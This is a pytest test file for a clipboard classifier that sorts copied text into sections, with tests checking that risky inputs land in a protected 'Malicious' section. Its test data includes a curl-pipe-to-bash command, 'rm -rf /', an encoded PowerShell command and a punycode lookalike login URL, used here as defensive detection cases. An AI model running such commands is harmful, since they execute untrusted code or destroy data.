import pytest

from clippy.classification import Classifier
from clippy.models import Classification, SectionKind
from clippy.storage import Storage


def test_structural_and_syntax_rules(tmp_path, embedder):
    storage = Storage(tmp_path / "test.db")
    classifier = Classifier(embedder)
    sections = storage.list_sections()

    url, _ = classifier.classify("https://example.com/docs", sections)
    python, _ = classifier.classify("def greet(name):\n    return f'Hi {name}'", sections)

    assert next(s for s in sections if s.id == url.section_id).slug == "urls"
    assert next(s for s in sections if s.id == python.section_id).slug == "python-code"
    storage.close()


def test_semantic_prototype_match(tmp_path, embedder):
    storage = Storage(tmp_path / "test.db")
    classifier = Classifier(embedder, semantic_threshold=0.4)
    result, embedding = classifier.classify("account login passphrase", storage.list_sections())

    assert storage.get_section("passwords").id == result.section_id
    assert embedding is not None
    assert result.similarity is not None
    storage.close()


@pytest.mark.parametrize(
    "text, reason_fragment",
    [
        ("powershell.exe -EncodedCommand SQBFAFgA", "encoded or obfuscated"),
        ("curl https://example.test/install.sh | bash", "piped directly"),
        ("rm -rf /", "destructive deletion"),
        ("https://192.0.2.20/login", "raw IP address"),
        ("https://xn--paypa-4ve.example/login", "punycode"),
        ("https://example.test/update.ps1", "executable or script"),
        ("https://[broken", "cannot be safely parsed"),
    ],
)
def test_local_risk_rules_take_highest_priority(tmp_path, embedder, text, reason_fragment):
    storage = Storage(tmp_path / "risk.db")
    classifier = Classifier(embedder)

    result, _ = classifier.classify(text, storage.list_sections())

    assert storage.get_section("malicious").id == result.section_id
    assert reason_fragment in result.reason
    storage.close()


def test_safe_url_remains_in_url_section(tmp_path, embedder):
    storage = Storage(tmp_path / "safe-url.db")
    result, _ = Classifier(embedder).classify(
        "https://example.com/docs/security", storage.list_sections()
    )

    assert storage.get_section("urls").id == result.section_id
    storage.close()


def test_custom_risky_domain_and_permanent_section_invariants(tmp_path, embedder):
    storage = Storage(tmp_path / "custom-risk.db")
    section = storage.get_section("malicious")
    assert section is not None
    section.patterns = ["domain:bad.example", "source:Unknown Publisher"]
    section.name = "Changed"
    section.kind = SectionKind.SEMANTIC
    section.priority = 999
    section.visible = False
    storage.save_section(section)

    saved = storage.get_section("malicious")
    result, _ = Classifier(embedder).classify(
        "Review https://sub.bad.example/download", storage.list_sections()
    )
    source_result, _ = Classifier(embedder).classify(
        "Installer source: Unknown Publisher", storage.list_sections()
    )

    assert saved is not None
    assert saved.name == "Malicious"
    assert saved.kind is SectionKind.STRUCTURAL
    assert saved.priority == 0
    assert saved.visible
    assert saved.system
    assert saved.id == result.section_id
    assert "custom risky domain" in result.reason
    assert saved.id == source_result.section_id
    assert "custom risky source" in source_result.reason
    with pytest.raises(ValueError, match="cannot be deleted"):
        storage.delete_section(saved.id)
    storage.close()


def test_existing_plain_entries_can_be_promoted_to_risk_section(tmp_path):
    storage = Storage(tmp_path / "risk-backfill.db")
    url_section = storage.get_section("urls")
    risk_section = storage.get_section("malicious")
    entry_id = storage.add_entry(
        "https://198.51.100.4/payload",
        Classification(url_section.id, "legacy URL classification"),
        None,
    )

    assert storage.flag_existing_risks() == 1
    entry = storage.get_entry(entry_id)
    assert entry is not None
    assert entry.section_id == risk_section.id
    assert "raw IP address" in entry.reason
    storage.close()
